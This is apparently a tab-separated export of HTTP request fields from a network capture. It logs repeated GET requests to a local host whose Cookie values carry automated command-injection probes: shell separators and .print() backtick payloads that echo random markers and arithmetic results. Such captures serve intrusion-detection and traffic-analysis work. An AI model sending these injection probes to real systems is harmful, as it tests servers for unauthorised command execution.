http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&;echo OLDGSG$((57+6))$(echo OLDGSG)OLDGSG//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&;echo OLDGSG$((57+6))$(echo OLDGSG)OLDGSG//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&;echo OLDGSG$((57+6))$(echo OLDGSG)OLDGSG//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&;echo OLDGSG$((57+6))$(echo OLDGSG)OLDGSG//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&;echo OLDGSG$((57+6))$(echo OLDGSG)OLDGSG//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&;echo OLDGSG$((57+6))$(echo OLDGSG)OLDGSG//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&;echo OLDGSG$((57+6))$(echo OLDGSG)OLDGSG//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&echo KUFFQZ$((11+0))$(echo KUFFQZ)KUFFQZ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&echo KUFFQZ$((11+0))$(echo KUFFQZ)KUFFQZ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&echo KUFFQZ$((11+0))$(echo KUFFQZ)KUFFQZ//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&echo KUFFQZ$((11+0))$(echo KUFFQZ)KUFFQZ//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&echo KUFFQZ$((11+0))$(echo KUFFQZ)KUFFQZ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&echo KUFFQZ$((11+0))$(echo KUFFQZ)KUFFQZ//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&echo KUFFQZ$((11+0))$(echo KUFFQZ)KUFFQZ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&echo KUFFQZ$((11+0))$(echo KUFFQZ)KUFFQZ//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&echo FOGGDV$((42+4))$(echo FOGGDV)FOGGDV//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&echo FOGGDV$((42+4))$(echo FOGGDV)FOGGDV//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&echo FOGGDV$((42+4))$(echo FOGGDV)FOGGDV//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&echo FOGGDV$((42+4))$(echo FOGGDV)FOGGDV//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&echo FOGGDV$((42+4))$(echo FOGGDV)FOGGDV//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&echo FOGGDV$((42+4))$(echo FOGGDV)FOGGDV//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&echo FOGGDV$((42+4))$(echo FOGGDV)FOGGDV//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&echo FOGGDV$((42+4))$(echo FOGGDV)FOGGDV//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&echo IKZYKQ$((0+76))$(echo IKZYKQ)IKZYKQ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&echo IKZYKQ$((0+76))$(echo IKZYKQ)IKZYKQ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&echo IKZYKQ$((0+76))$(echo IKZYKQ)IKZYKQ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&echo IKZYKQ$((0+76))$(echo IKZYKQ)IKZYKQ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&&echo JRUAYG$((83+84))$(echo JRUAYG)JRUAYG//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&&echo JRUAYG$((83+84))$(echo JRUAYG)JRUAYG//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&&echo JRUAYG$((83+84))$(echo JRUAYG)JRUAYG//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&&echo JRUAYG$((83+84))$(echo JRUAYG)JRUAYG//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&&echo JRUAYG$((83+84))$(echo JRUAYG)JRUAYG//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&&echo JRUAYG$((83+84))$(echo JRUAYG)JRUAYG//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&&echo JRUAYG$((83+84))$(echo JRUAYG)JRUAYG//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&&echo JRUAYG$((83+84))$(echo JRUAYG)JRUAYG//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&&echo FXJWNW$((40+8))$(echo FXJWNW)FXJWNW//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&&echo FXJWNW$((40+8))$(echo FXJWNW)FXJWNW//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&&echo FXJWNW$((40+8))$(echo FXJWNW)FXJWNW//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&&echo FXJWNW$((40+8))$(echo FXJWNW)FXJWNW//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&&echo FXJWNW$((40+8))$(echo FXJWNW)FXJWNW//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&&echo FXJWNW$((40+8))$(echo FXJWNW)FXJWNW//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&&&echo FXJWNW$((40+8))$(echo FXJWNW)FXJWNW//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&&&echo FXJWNW$((40+8))$(echo FXJWNW)FXJWNW//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&|echo EMRFZW$((30+12))$(echo EMRFZW)EMRFZW//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&|echo EMRFZW$((30+12))$(echo EMRFZW)EMRFZW//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&|echo EMRFZW$((30+12))$(echo EMRFZW)EMRFZW//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&|echo EMRFZW$((30+12))$(echo EMRFZW)EMRFZW//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&|echo EMRFZW$((30+12))$(echo EMRFZW)EMRFZW//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&|echo EMRFZW$((30+12))$(echo EMRFZW)EMRFZW//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&|echo EMRFZW$((30+12))$(echo EMRFZW)EMRFZW//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&|echo EMRFZW$((30+12))$(echo EMRFZW)EMRFZW//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&|echo VZJWEY$((25+30))$(echo VZJWEY)VZJWEY//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&|echo VZJWEY$((25+30))$(echo VZJWEY)VZJWEY//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&|echo VZJWEY$((25+30))$(echo VZJWEY)VZJWEY//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&|echo VZJWEY$((25+30))$(echo VZJWEY)VZJWEY//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&|echo VZJWEY$((25+30))$(echo VZJWEY)VZJWEY//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&|echo VZJWEY$((25+30))$(echo VZJWEY)VZJWEY//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&|echo VZJWEY$((25+30))$(echo VZJWEY)VZJWEY//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&|echo VZJWEY$((25+30))$(echo VZJWEY)VZJWEY//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&||echo GYVXGJ$((75+72))$(echo GYVXGJ)GYVXGJ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&||echo GYVXGJ$((75+72))$(echo GYVXGJ)GYVXGJ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&||echo GYVXGJ$((75+72))$(echo GYVXGJ)GYVXGJ//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&||echo GYVXGJ$((75+72))$(echo GYVXGJ)GYVXGJ//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&||echo GYVXGJ$((75+72))$(echo GYVXGJ)GYVXGJ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&||echo GYVXGJ$((75+72))$(echo GYVXGJ)GYVXGJ//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&||echo GYVXGJ$((75+72))$(echo GYVXGJ)GYVXGJ//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&||echo GYVXGJ$((75+72))$(echo GYVXGJ)GYVXGJ//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&||echo YJGWKC$((62+22))$(echo YJGWKC)YJGWKC//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&||echo YJGWKC$((62+22))$(echo YJGWKC)YJGWKC//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&||echo YJGWKC$((62+22))$(echo YJGWKC)YJGWKC//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&||echo YJGWKC$((62+22))$(echo YJGWKC)YJGWKC//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&||echo YJGWKC$((62+22))$(echo YJGWKC)YJGWKC//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&||echo YJGWKC$((62+22))$(echo YJGWKC)YJGWKC//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&||echo YJGWKC$((62+22))$(echo YJGWKC)YJGWKC//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&||echo YJGWKC$((62+22))$(echo YJGWKC)YJGWKC//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&%0aecho NFZGCC$((86+38))$(echo NFZGCC)NFZGCC//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&%0aecho NFZGCC$((86+38))$(echo NFZGCC)NFZGCC//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&%0aecho NFZGCC$((86+38))$(echo NFZGCC)NFZGCC//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&%0aecho NFZGCC$((86+38))$(echo NFZGCC)NFZGCC//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&%0aecho NFZGCC$((86+38))$(echo NFZGCC)NFZGCC//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&%0aecho NFZGCC$((86+38))$(echo NFZGCC)NFZGCC//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&%0aecho NFZGCC$((86+38))$(echo NFZGCC)NFZGCC//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&%0aecho NFZGCC$((86+38))$(echo NFZGCC)NFZGCC//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&%0d%0aecho OJXAHI$((26+52))$(echo OJXAHI)OJXAHI//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&%0d%0aecho OJXAHI$((26+52))$(echo OJXAHI)OJXAHI//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&%0d%0aecho OJXAHI$((26+52))$(echo OJXAHI)OJXAHI//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&%0d%0aecho OJXAHI$((26+52))$(echo OJXAHI)OJXAHI//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&%0d%0aecho OJXAHI$((26+52))$(echo OJXAHI)OJXAHI//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&%0d%0aecho OJXAHI$((26+52))$(echo OJXAHI)OJXAHI//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			'&%0d%0aecho OJXAHI$((26+52))$(echo OJXAHI)OJXAHI//				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			'&%0d%0aecho OJXAHI$((26+52))$(echo OJXAHI)OJXAHI//				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo GHVIZU`.`echo $((78+30))`.`echo GHVIZU`.`echo GHVIZU`)				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo GHVIZU`.`echo $((78+30))`.`echo GHVIZU`.`echo GHVIZU`)				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo GHVIZU`.`echo $((78+30))`.`echo GHVIZU`.`echo GHVIZU`)				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo GHVIZU`.`echo $((78+30))`.`echo GHVIZU`.`echo GHVIZU`)				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo GHVIZU`.`echo $((78+30))`.`echo GHVIZU`.`echo GHVIZU`)				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo GHVIZU`.`echo $((78+30))`.`echo GHVIZU`.`echo GHVIZU`)				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo GHVIZU`.`echo $((78+30))`.`echo GHVIZU`.`echo GHVIZU`)				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo GHVIZU`.`echo $((78+30))`.`echo GHVIZU`.`echo GHVIZU`)				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo BYHOOY%0aecho $((55+68))%0aecho BYHOOY%0aecho BYHOOY`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo BYHOOY%0aecho $((55+68))%0aecho BYHOOY%0aecho BYHOOY`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo BYHOOY%0aecho $((55+68))%0aecho BYHOOY%0aecho BYHOOY`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo BYHOOY%0aecho $((55+68))%0aecho BYHOOY%0aecho BYHOOY`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo BYHOOY%0aecho $((55+68))%0aecho BYHOOY%0aecho BYHOOY`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo BYHOOY%0aecho $((55+68))%0aecho BYHOOY%0aecho BYHOOY`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo BYHOOY%0aecho $((55+68))%0aecho BYHOOY%0aecho BYHOOY`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo BYHOOY%0aecho $((55+68))%0aecho BYHOOY%0aecho BYHOOY`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KVWGQM\necho $((79+57))\necho KVWGQM\necho KVWGQM`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KVWGQM\necho $((79+57))\necho KVWGQM\necho KVWGQM`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KVWGQM\necho $((79+57))\necho KVWGQM\necho KVWGQM`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KVWGQM\necho $((79+57))\necho KVWGQM\necho KVWGQM`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KVWGQM\necho $((79+57))\necho KVWGQM\necho KVWGQM`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KVWGQM\necho $((79+57))\necho KVWGQM\necho KVWGQM`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KVWGQM\necho $((79+57))\necho KVWGQM\necho KVWGQM`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KVWGQM\necho $((79+57))\necho KVWGQM\necho KVWGQM`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo ZTCIEP%0d%0aecho $((76+30))%0d%0aecho ZTCIEP%0d%0aecho ZTCIEP`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo ZTCIEP%0d%0aecho $((76+30))%0d%0aecho ZTCIEP%0d%0aecho ZTCIEP`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo ZTCIEP%0d%0aecho $((76+30))%0d%0aecho ZTCIEP%0d%0aecho ZTCIEP`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo ZTCIEP%0d%0aecho $((76+30))%0d%0aecho ZTCIEP%0d%0aecho ZTCIEP`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo ZTCIEP%0d%0aecho $((76+30))%0d%0aecho ZTCIEP%0d%0aecho ZTCIEP`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo ZTCIEP%0d%0aecho $((76+30))%0d%0aecho ZTCIEP%0d%0aecho ZTCIEP`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo ZTCIEP%0d%0aecho $((76+30))%0d%0aecho ZTCIEP%0d%0aecho ZTCIEP`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo ZTCIEP%0d%0aecho $((76+30))%0d%0aecho ZTCIEP%0d%0aecho ZTCIEP`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo OLJOEL\r\necho $((90+46))\r\necho OLJOEL\r\necho OLJOEL`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo OLJOEL\r\necho $((90+46))\r\necho OLJOEL\r\necho OLJOEL`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo OLJOEL\r\necho $((90+46))\r\necho OLJOEL\r\necho OLJOEL`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo OLJOEL\r\necho $((90+46))\r\necho OLJOEL\r\necho OLJOEL`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo OLJOEL\r\necho $((90+46))\r\necho OLJOEL\r\necho OLJOEL`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo OLJOEL\r\necho $((90+46))\r\necho OLJOEL\r\necho OLJOEL`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo OLJOEL\r\necho $((90+46))\r\necho OLJOEL\r\necho OLJOEL`);				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo OLJOEL\r\necho $((90+46))\r\necho OLJOEL\r\necho OLJOEL`);				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KWRHON`.`echo $((11+44))`.`echo KWRHON`.`echo KWRHON`)}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KWRHON`.`echo $((11+44))`.`echo KWRHON`.`echo KWRHON`)}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KWRHON`.`echo $((11+44))`.`echo KWRHON`.`echo KWRHON`)}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KWRHON`.`echo $((11+44))`.`echo KWRHON`.`echo KWRHON`)}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KWRHON`.`echo $((11+44))`.`echo KWRHON`.`echo KWRHON`)}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KWRHON`.`echo $((11+44))`.`echo KWRHON`.`echo KWRHON`)}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KWRHON`.`echo $((11+44))`.`echo KWRHON`.`echo KWRHON`)}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KWRHON`.`echo $((11+44))`.`echo KWRHON`.`echo KWRHON`)}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KYXGDI%0aecho $((82+36))%0aecho KYXGDI%0aecho KYXGDI`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KYXGDI%0aecho $((82+36))%0aecho KYXGDI%0aecho KYXGDI`);}}				/web
